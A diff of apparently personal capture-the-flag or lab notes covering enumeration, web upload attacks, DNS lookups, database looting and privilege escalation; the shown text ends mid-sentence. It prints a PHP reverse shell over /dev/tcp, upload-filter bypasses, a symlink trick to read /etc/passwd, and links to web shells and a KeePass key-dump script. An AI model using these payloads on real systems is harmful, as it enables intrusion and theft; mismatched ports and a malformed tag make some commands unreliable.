@@ -6,7 +6,8 @@ In this article, we consider that we are connected to the vpn that allows us to 
 Please double check that you are connected to the vpn before starting.
 
 ## Discovery
-The starting point is almost always the same : Enumerate to discover the open ports that may help us get an initial foothold in the machine.
+The starting point is almost always the same : Enumerate to discover the open ports that may help us get an initial foothold in the machine. After all, at this point all we have is an ip address and a challenge title (that sometimes contains some hints).
+
 To do so, we run nmap as follows:
 ```bash
 $ nmap -n -Pn -sV 10.13.37.10
@@ -33,16 +34,53 @@ To do so, we execute the following:
 ```bash
 $ sudo echo '10.13.37.10 sowon.mold' >> /etc/hosts
 ```
-Once in the webpage, check all pages and look for webpages that are of interest: a login page, a file submission page, a page that displays user-input ... Or CMS versions that are used in the webpage (joomla, ...)
+Once in the webpage, check all pages and look for webpages that are of interest: a login page, a file submission page, some known web-building block (wordpress, joomla, Spring boot and actuators...)
 
 ### Login Page
-If the website is based on a known ......? page ..??, google for possible default credentials and try them.
-: Examples of default credentials are: admin/admin, user/password etc...
+The first step is to look for credentials in source code, if none are found look for default credentials online, otherwise use burp to bruteforce for default credentials.
 
-### File submission page
+If the website is based on a known ticket management system, a content management system or similar, google for possible default credentials and try them, or for possible past vulnerable versions.
+: Examples of default credentials are: admin/admin, user/password, root/password etc...
 
-### Known CMS or ...?
+### File upload page
+When a webpage allows file upload, an attacker can upload a file containing malicious code and run it.
+Some of these webpages are protected by black-listing some extensions but that can easily be bypassed. Some techniques include doubling extensions "file.png.php" or adding null-bytes "file.php%00.png"
+
+When we can upload files, always think of reverse shells php that can be submitted.
+You can also use ready-to-use ones like the ones found here: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+#### php code for reverse shell
+An example of php code that can be injected to retrieve a reverse shell on port 9001 is:
+```php
+<?php
+system('bash -c "bash -i >& /dev/tcp/10.13.37.10/9001 0>&1"');
+php>
+```
+N.B.: make sure you have ran the following command beforehand, to have an active listener on your machine for any incoming connections:
+```bash
+$ nc -nvlp 9991
+```
+#### Zip file upload
+In some cases, the security measure in place is a white-listing of certain files. One example that I encountered is a webpage that asks specifically for a pdf file in a zip file. In this case, I used symlinks.
+The following command creates a link to the file "../../../../../../etc/passwd" and names that link as "document.pdf"
+```bash
+$ ln -s ../../../../../../etc/passwd document.pdf
+```
+The next command creates a symlink zip that will be uploaded.
+```bash
+$ zip --symlinks doc.zip document.pdf
+```
+After uploading, the webpage provides the url of the file location.
+By inspecting the Network exchange we get a base64 response (stored in "responsebase64characters") that is then deciphered using the following:
+```bash
+$ echo responsebase64characters | base64 -d
+```
+
+### Known CMS (Content Management System)
 The first thing to do is to google for known vuulnerabilities and exploits. To do that we can google "name_of_CMS_version CVE exploit".
+
+#### Joomla CMS
+When a Joomla CMS based website is encountered, joomscan is a very useful tool that can help us get a lot of information, including credentials that may be used later for privilege escalation.
 
 ### Brute-force enumeration of directories and files
 This is a technique that uses known wordlists to brute-force for files and directories hosted in the webserver and that aren't directly accessible by the user from the previous webpage.
@@ -62,7 +100,7 @@ $ gobuster vhost -u sowon.mold -w /usr/share/seclists/Discovery/DNS/subdomains-t
 ```
 
 ## DNS
-The first step is to execute a dig command to .....
+The first step is to execute a dig (Domain Information Groper) command to perform a lookup of the provided name servers or ip addresses and show the results.
 
 ```bash
 $ dig -x 10.13.37.10 @10.13.37.10       
@@ -104,7 +142,26 @@ sowon.mold.       604800  IN      SOA     www.sowon.mold. sowon.mold. 2 604800 8
 ;; WHEN: Fri Jan 05 09:21:27 EST 2024
 ;; XFR size: 5 records (messages 1, bytes 167)
 ```
-
 TODO : DNS examples from other walkthroughs are probably better
 
-## Databases : SQL, KeePass, 
+## Databases : SQL, KeePass, ...
+To escalate previleges, a common approach is to search for databases or their files, especially the ones that may contain passwords. This is why we should look for services such as SQL that are running on a vulnerable version, or Keepass files.
+
+* For any database file encountered, run a "strings db_file" to look for any useful information that may be loosely encrypted and secured. 'strings' is a better choice than 'cat' because of the type fo these files.
+* If a KDBX file is encountered while lokking to escalate privileges, use this script to get the master key of the keepass dump file : https://github.com/matro7sh/keepass-dump-masterkey/blob/main/poc.py 
+* If an SQL database is present, which is mostly the case when the box hosts webservers, look up if there are any vulnerabilities specific to that sql version.
+* If it's possible, access the SQL database and search through the tables for something interesting like "users" or "credentials" etc...
+## Privilege Escalation
+The following is a command that should always be ran when we have an initial access to a box and are trying to get higher privileges:
+
+```bash
+sudo -l
+```
+The output is all the commands and scripts that the current user can run as sudo. This usually helps us get a sudo shell, which is our goal.
+
+## Windows box
+Sometimes we encounter Windows boxes instead of Linux-based ones.
+The initial step is the same: a discovery using nmap.
+
+### SMB : 
+This is a 
